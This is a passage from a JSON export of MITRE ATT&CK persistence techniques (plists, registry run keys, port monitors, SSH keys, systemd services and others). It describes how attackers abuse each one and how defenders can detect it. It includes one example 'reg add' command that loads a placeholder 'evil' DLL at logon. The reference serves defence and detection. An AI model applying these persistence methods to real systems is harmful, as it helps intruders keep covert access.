&gt;. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>\/Library\/Preferences<\/code> (which execute with elevated privileges) and <code>~\/Library\/Preferences<\/code> (which execute with a user's privileges). <\/p>\n<p>Adversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.(Citation: Sofacy Komplex Trojan) <\/p>\n<p>A specific plist used for execution at login is <code>com.apple.loginitems.plist<\/code>.(Citation: Methods of Mac Malware Persistence) Applications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.(Citation: Adding Login Items) Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). Some of these applications can open visible dialogs to the user, but they don\u2019t all have to since there is an option to &quot;hide&quot; the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled<\/code> can be used to set Login Items, but scripting languages like <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/002\">AppleScript<\/a> can do this as well. (Citation: Adding Login Items)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like \"Knock Knock\" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.\n\nAll the login items created via shared file lists are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area (and the corresponding file locations) should be monitored and allowed for known good applications. Otherwise, Login Items are located in <code> Contents\/Library\/LoginItems <\/code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items)\n\nMonitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":697,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":700,"name":"T1547.010 - Port Monitors","sort_id":0,"external_id":"T1547.010","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor<\/code> API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32<\/code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors<\/code>. <\/p>\n<p>The Registry key contains entries for the following:<\/p>\n<ul>\n<li>Local Port<\/li>\n<li>Standard TCP\/IP Port<\/li>\n<li>USB Monitor<\/li>\n<li>WSD Port<\/li>\n<\/ul>\n<p>Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process API calls to <code>AddMonitor<\/code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors<\/code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism (Citation: TechNet Autoruns)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":700,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":716,"name":"T1037.004 - Rc.common","sort_id":0,"external_id":"T1037.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes <code>source \/etc\/rc.common<\/code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated mechanism in favor of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/001\">Launch Agent<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a> but is currently still used.<\/p>\n<p>Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user. (Citation: Methods of Mac Malware Persistence)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The <code>\/etc\/rc.common<\/code> file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior. ","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":716,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":717,"name":"T1547.007 - Re-opened Applications","sort_id":0,"external_id":"T1547.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~\/Library\/Preferences\/com.apple.loginwindow.plist<\/code> and <code>~\/Library\/Preferences\/ByHost\/com.apple.loginwindow.* .plist<\/code>. <\/p>\n<p>An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":717,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":719,"name":"T1547.001 - Registry Run Keys \/ Startup Folder","sort_id":0,"external_id":"T1547.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the &quot;run keys&quot; in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.<\/p>\n<p>Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup<\/code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp<\/code>.<\/p>\n<p>The following run keys are created by default on Windows systems:<\/p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code><\/li>\n<\/ul>\n<p>The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx<\/code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a &quot;Depend&quot; key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend \/v 1 \/d &quot;C:\\temp\\evil[.]dll&quot;<\/code> (Citation: Oddvar Moe RunOnceEx Mar 2018)<\/p>\n<p>The following Registry keys can be used to set startup folder items for persistence:<\/p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code><\/li>\n<\/ul>\n<p>The following Registry keys can control automatic startup of services during boot:<\/p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<\/code><\/li>\n<\/ul>\n<p>Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:<\/p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<\/code><\/li>\n<\/ul>\n<p>The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit<\/code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell<\/code> subkeys can automatically launch programs.<\/p>\n<p>Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> run when any user logs on.<\/p>\n<p>By default, the multistring <code>BootExecute<\/code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager<\/code> is set to <code>autocheck autochk *<\/code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.<\/p>\n<p>Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to make the Registry entries look as if they are associated with legitimate programs.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":719,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":735,"name":"T1505.001 - SQL Stored Procedures","sort_id":0,"external_id":"T1505.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started\/restarted).<\/p>\n<p>Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) <\/p>\n<p>Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":735,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":735,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":737,"name":"T1098.004 - SSH Authorized Keys","sort_id":0,"external_id":"T1098.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify the SSH <code>authorized_keys<\/code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys<\/code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;\/.ssh\/authorized_keys<\/code>.(Citation: SSH Authorized Keys) Users may edit the system\u2019s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \u201cyes\u201d to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>\/etc\/ssh\/sshd_config<\/code>.<\/p>\n<p>Adversaries may modify SSH <code>authorized_keys<\/code> files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim Worm)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use file integrity monitoring to detect changes made to the <code>authorized_keys<\/code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys<\/code> file.\n\nMonitor for changes to and suspicious processes modifiying <code>\/etc\/ssh\/sshd_config<\/code>.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":737,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":737,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":743,"name":"T1547.005 - Security Support Provider","sort_id":0,"external_id":"T1547.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.<\/p>\n<p>The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages<\/code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages<\/code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe<\/code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":743,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":747,"name":"T1574.010 - Services File Permissions Weakness","sort_id":0,"external_id":"T1574.010","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<\/p>\n<p>Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and\/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":747,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":748,"name":"T1574.011 - Services Registry Permissions Weakness","sort_id":0,"external_id":"T1574.011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services<\/code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>, or <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>. Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: Registry Key Security)<\/p>\n<p>If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath\/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and\/or privilege escalation to the account context the service is set to execute under (local\/domain account, SYSTEM, LocalService, or NetworkService).<\/p>\n<p>Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand<\/code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), so additional logging may need to be configured to gather the appropriate data.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":748,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":751,"name":"T1547.009 - Shortcut Modification","sort_id":0,"external_id":"T1547.009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.<\/p>\n<p>Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":751,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":759,"name":"T1037.005 - Startup Items","sort_id":0,"external_id":"T1037.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. (Citation: Startup Items)<\/p>\n<p>This is technically a deprecated technology (superseded by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a>), and thus the appropriate folder, <code>\/Library\/StartupItems<\/code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist<\/code>, reside in the top-level directory. <\/p>\n<p>An adversary can create the appropriate folders\/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The <code>\/Library\/StartupItems<\/code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\n\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":759,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":768,"name":"T1542.001 - System Firmware","sort_id":0,"external_id":"T1542.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input\/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)<\/p>\n<p>System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read\/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":768,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":770,"name":"T1543.002 - Systemd Service","sort_id":0,"external_id":"T1543.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.<\/p>\n<p>Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>\/etc\/systemd\/system<\/code> and <code>\/usr\/lib\/systemd\/system<\/code> directories and have the file extension <code>.service<\/code>. Each service unit file may contain numerous directives that can execute system commands:<\/p>\n<ul>\n<li>ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. <\/li>\n<li>ExecReload directive covers when a service restarts. <\/li>\n<li>ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.<\/li>\n<\/ul>\n<p>Adversaries have used systemd functionality to establish persistent access to victim systems by creating and\/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)<\/p>\n<p>While adversaries typically require root privileges to create\/modify service unit files in the <code>\/etc\/systemd\/system<\/code> and <code>\/usr\/lib\/systemd\/system<\/code> directories, low privilege users can create\/modify service unit files in directories such as <code>~\/.config\/systemd\/user\/<\/code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Systemd service unit files may be detected by auditing file creation and modification events within the <code>\/etc\/systemd\/system<\/code>, <code>\/usr\/lib\/systemd\/system\/<\/code>, and 